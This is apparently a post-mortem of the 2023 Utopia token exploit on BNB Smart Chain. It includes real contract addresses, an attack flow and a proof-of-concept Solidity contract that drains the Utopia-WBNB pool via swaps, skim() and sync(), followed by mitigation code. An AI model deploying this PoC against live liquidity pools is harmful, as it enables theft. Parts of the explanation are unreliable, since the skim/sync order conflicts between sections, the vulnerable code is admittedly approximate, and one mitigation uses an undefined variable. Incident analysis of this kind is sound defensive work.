# Utopia Business Logic Flaw Incident Analysis

## 1. Overview

| Field | Details |
|------|------|
| Project | Utopia |
| Date | 2023-07-28 |
| Chain | BSC (Binance Smart Chain) |
| Loss | ~$119,000 USD |
| Attack Type | Business Logic Flaw |
| CWE | CWE-840 (Business Logic Errors) |
| Attacker Address | `0xe84ef3615b8df94c52e5b6ef21acbf0039b29113` |
| Attack Contract | `0x6191203510c2a6442faecdb6c7bb837a76f02d23` |
| Vulnerable Contract | `0xb1da08c472567eb0EC19639b1822F578d39F3333` (Utopia) |
| Fork Block | 30,119,396 |

## 2. Vulnerability Code Analysis

The Utopia contract calculated airdrop addresses in a predictable manner, enabling exploitation of pair balance imbalances. It was possible to extract tokens from the pair by combining the `skim()` and `sync()` functions.

```solidity
// Vulnerable pattern: predictable airdrop address + skim/sync manipulation
contract Utopia {
    address public pair;

    function _transfer(address from, address to, uint256 amount) internal override {
        // Vulnerable: partial transfer to a fixed, predictable airdrop address
        uint256 airdropAmount = amount * 3 / 1000; // 0.3%
        address airdropAddress = address(
            uint160(uint256(keccak256(abi.encodePacked(from, to, block.number))))
            // In practice, an even more predictable calculation is used
        );
        super._transfer(from, airdropAddress, airdropAmount);
        super._transfer(from, to, amount - airdropAmount);
    }
}

// Combined with the pair's skim/sync vulnerability
// sync() → updates reserves to match current balances
// skim() → sends the excess above reserves to a specified address
```

**Vulnerability**: Because the airdrop recipient address was predictable, when tokens were transferred to the pair contract the airdrop inflated the pair's balance, which could then be drained via `skim()`.

### On-Chain Original Code

Source: Bytecode decompilation

```solidity
// Root cause: Business Logic Flaw
// Unverified source code — analysis based on bytecode
```

## 3. Attack Flow

```
Attacker [0xe84ef3615b8df94c52e5b6ef21acbf0039b29113]
  │
  ├─1─▶ Execute WBNBToUtopia()
  │      [Router: 0x10ED43C718714eb63d5aA57B78B54704E256024E]
  │      Swap WBNB → Utopia tokens
  │
  ├─2─▶ Call Pair.skim(address(this))
  │      [Pair: 0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5]
  │      Extract the balance increase caused by the airdrop
  │
  ├─3─▶ Call Pair.sync()
  │      Reset reserves to current balances (price manipulation)
  │
  ├─4─▶ Execute UtopiaToWBNB()
  │      Swap Utopia → WBNB
  │      Apply favorable exchange rate from manipulated reserves
  │
  └─5─▶ Realize profit (~$119K USD)
```

## 4. PoC Core Code

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

interface IUtopia is IERC20 {}

contract UtopiaExploit {
    IUtopia utopia = IUtopia(0xb1da08c472567eb0EC19639b1822F578d39F3333);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    Uni_Pair_V2 pair = Uni_Pair_V2(0xfeEf619a56fCE9D003E20BF61393D18f62B0b2D5);
    Uni_Router_V2 router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function testExploit() external {
        WBNBToUtopia();
        pair.skim(address(this));
        pair.sync();
        UtopiaToWBNB();
    }

    function WBNBToUtopia() internal {
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(utopia);
        WBNB.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function UtopiaToWBNB() internal {
        address[] memory path = new address[](2);
        path[0] = address(utopia);
        path[1] = address(WBNB);
        utopia.approve(address(router), type(uint256).max);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            utopia.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
```

## 5. Vulnerability Classification

| Field | Details |
|------|------|
| CWE | CWE-840 (Business Logic Errors) |
| Vulnerability Type | Predictable address + skim/sync manipulation |
| Impact Scope | Utopia-WBNB liquidity pool |
| Explorer | [BSCscan](https://bscscan.com/address/0xb1da08c472567eb0EC19639b1822F578d39F3333) |

## 6. Security Recommendations

```solidity
// Mitigation 1: Make the airdrop address unpredictable
contract Utopia {
    function _getAirdropAddress(address from, address to) internal view returns (address) {
        // Use block.prevrandao (EIP-4399) or Chainlink VRF
        bytes32 randomHash = keccak256(abi.encodePacked(
            from, to, blockhash(block.number - 1), block.prevrandao
        ));
        return address(uint160(uint256(randomHash)));
    }
}

// Mitigation 2: Prohibit airdrops to LP pair addresses
function _transfer(address from, address to, uint256 amount) internal override {
    address airdropAddr = _getAirdropAddress(from, to);
    // Block airdrops to the pair address
    if (airdropAddr == pair) {
        airdropAddr = address(0xdead);  // redirect to burn address
    }
    super._transfer(from, airdropAddr, airdropAmount);
}

// Mitigation 3: Disable skim()
// When using a custom pair, remove skim()
function skim(address) external override {
    revert("skim disabled for security");
}
```

## 7. Lessons Learned

1. **Airdrop logic combined with AMM vulnerabilities**: Automatic airdrop logic triggered on token transfers becomes an attack vector when combined with the `skim()` function of an AMM pair.
2. **Predictable address generation**: Addresses derived from `keccak256(from, to, blockNumber)` are predictable. Sufficient entropy is required.
3. **Combined sync() and skim() attack**: Chaining `sync()` followed by `skim()` allows extraction of the difference between pair reserves and actual balances. This pattern recurs across numerous BSC token attacks.
4. **BSC Tax/Fee Token pattern**: Tokens with transfer taxes can produce unexpected behavior when interacting with AMMs; thorough testing is required before AMM integration.